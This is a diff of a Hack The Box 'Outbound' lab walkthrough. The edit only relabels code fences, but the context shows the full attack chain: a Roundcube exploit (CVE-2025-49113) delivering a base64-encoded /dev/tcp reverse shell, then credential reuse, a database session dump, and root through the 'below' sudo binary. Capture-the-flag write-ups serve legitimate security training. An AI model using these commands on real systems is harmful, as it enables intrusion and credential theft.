@@ -21,7 +21,7 @@ media_subpath: /assets/img/htb/outbound/
 ## Adding IP to /etc/hosts
 
 Add your machine IP into your /etc/hosts:
-```terminal
+```bash
 10.10.11.77 outbound.htb
 ```
 
@@ -29,7 +29,7 @@ Add your machine IP into your /etc/hosts:
 
 Let's use Rustscan/Nmap to check the ports on the Outbound machine.
 
-```terminal
+```bash
 ┌──(kali㉿kali)-[~/Desktop/HTB/Outbound]
 └─$ rustscan -a outbound.htb -- -A
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
@@ -150,7 +150,7 @@ Nmap done: 1 IP address (1 host up) scanned in 10.85 seconds
 
 This is a lot of output from Rustscan (as normal), but this is the main part you need to focus on.
 
-```terminal
+```bash
 PORT   STATE SERVICE REASON         VERSION
 22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
@@ -173,7 +173,7 @@ We only have two ports: SSH (20) and HTTP (80). Let's first check HTTP.
 
 It seems like the IP address redirects to mail.outbound.htb, not oubound.htb. We can add mail.outbound.htb to the end of line in /etc/hosts. It would look like this now:
 
-```terminal
+```bash
 10.10.11.77 outbound.htb mail.outbound.htb
 ```
 
@@ -199,7 +199,7 @@ We do have exploits! The specific CVE name is CVE-2025-49113. I would recommend 
 
 To actually exploit this program, we can use this: [https://github.com/hakaioffsec/CVE-2025-49113-exploit](https://github.com/hakaioffsec/CVE-2025-49113-exploit).
 
-```terminal
+```bash
 ┌──(kali㉿kali)-[~/Desktop/HTB/Outbound]
 └─$ git clone https://github.com/hakaioffsec/CVE-2025-49113-exploit.git
 
@@ -209,7 +209,7 @@ To actually exploit this program, we can use this: [https://github.com/hakaioffs
 
 We need to setup a listener on our attacker machine. We can use Netcat or [Penelope](https://github.com/brightio/penelope).
 
-```terminal
+```bash
 ┌──(kali㉿kali)-[~/Desktop/HTB/Outbound/CVE-2025-49113-exploit]
 └─$ penelope -p 1337
 [+] Listening for reverse shells on 0.0.0.0:1337 →  REDACTEDS
@@ -217,13 +217,13 @@ We need to setup a listener on our attacker machine. We can use Netcat or [Penel
 ```
 
 Now, for the exploit, we can use this command:
-```terminal
+```bash
 php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 'printf base_64_stuff | base64 -d | bash'
 ```
 
 Change the `base_64_stuff` to `(bash >& /dev/tcp/Your_IP/Your_Port 0>&1) &` in base64.
 
-```terminal
+```bash
 ┌──(kali㉿kali)-[~/Desktop/HTB/Outbound/CVE-2025-49113-exploit]
 └─$ php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 'printf base_64_stuff | base64 -d | bash'-d | bash'
 [+] Starting exploit (CVE-2025-49113)...
@@ -235,7 +235,7 @@ Change the `base_64_stuff` to `(bash >& /dev/tcp/Your_IP/Your_Port 0>&1) &` in b
 [+] Gadget uploaded successfully!
 ```
 
-```terminal
+```bash
 ┌──(kali㉿kali)-[~/Desktop/HTB/Outbound/CVE-2025-49113-exploit]
 └─$ penelope -p 1337
 [+] Listening for reverse shells on 0.0.0.0:1337 →  REDACTEDS
@@ -259,7 +259,7 @@ We got a reverse shell!
 ## User Flag
 It's possible that the tyler user uses the same password as the mail site. We can do `su tyler` and put in the password.
 
-```terminal
+```bash
 www-data@mail:/$ su tyler
 Password: 
 tyler@mail:/$
@@ -267,14 +267,14 @@ tyler@mail:/$
 
 It worked! Let's try `sudo -l` for anything would could use.
 
-```terminal
+```bash
 tyler@mail:/$ sudo -l
 bash: sudo: command not found
 ```
 
 Hmm, doesn't seem sudo exists. Let's check for any configuration files available.
 
-```terminal
+```bash
 tyler@mail:/$ cd /var/www/html
 tyler@mail:/var/www/html$ ls
 index.nginx-debian.html  roundcube
@@ -289,7 +289,7 @@ README.md     bin          index.php      public_html
 
 So we do have a config folder. Let's check it out.
 
-```terminal
+```bash
 tyler@mail:/var/www/html/roundcube$ cd config
 tyler@mail:/var/www/html/roundcube/config$ ls
 config.inc.php  config.inc.php.sample  defaults.inc.php  mimetypes.php
@@ -370,7 +370,7 @@ We have a `des_key`, which might be useful in the future. We also have a host, u
 
 ### MySQL
 
-```terminal
+```bash
 tyler@mail:/var/www/html/roundcube/config$ mysql -h localhost -u roundcube -p
 Enter password: 
 Welcome to the MariaDB monitor.  Commands end with ; or \g.
@@ -434,7 +434,7 @@ MariaDB [roundcube]>
 
 It seems like we got some sort of client hash, but it seems like its only for preferences on the website. Let's continue searching.
 
-```terminal
+```bash
 MariaDB [roundcube]> select * from session;
 +----------------------------+---------------------+------------+-----------------+
 | sess_id                    | changed             | ip         | vars            |
@@ -491,7 +491,7 @@ Hmm, we have an email from tyler, let's check it out.
 
 It seems like we got another password! Since this is different from the Roundcube password, its probably jacob's SSH password!
 
-```terminal
+```bash
 ┌──(kali㉿kali)-[~/Desktop/HTB/Outbound]
 └─$ ssh jacob@outbound.htb
 The authenticity of host 'outbound.htb (10.10.11.77)' can't be established.
@@ -537,7 +537,7 @@ REDACTED
 
 Let's try `sudo -l` as jacob.
 
-```terminal
+```bash
 jacob@outbound:~$ sudo -l
 Matching Defaults entries for jacob on outbound:
     env_reset, mail_badpass,
@@ -554,7 +554,7 @@ Hmm, we have access to the `/usr/bin/below` command. After researching, I got th
 
 We need to check if the `/var/log/below` folder and the `/var/log/below/error_root.log` file are both world writable.
 
-```terminal
+```bash
 jacob@outbound:~cd $ ls -lah /var/log | grep below
 drwxrwxrwx   3 root      root            4.0K Nov 11 11:08 below
 jacob@outbound:~$ cd /var/log/below
@@ -699,7 +699,7 @@ root@outbound:/tmp#
 
 We are root! Let's get the root flag!
 
-```terminal
+```bash
 root@outbound:/tmp# cd /root
 root@outbound:~# ls
 root.txt
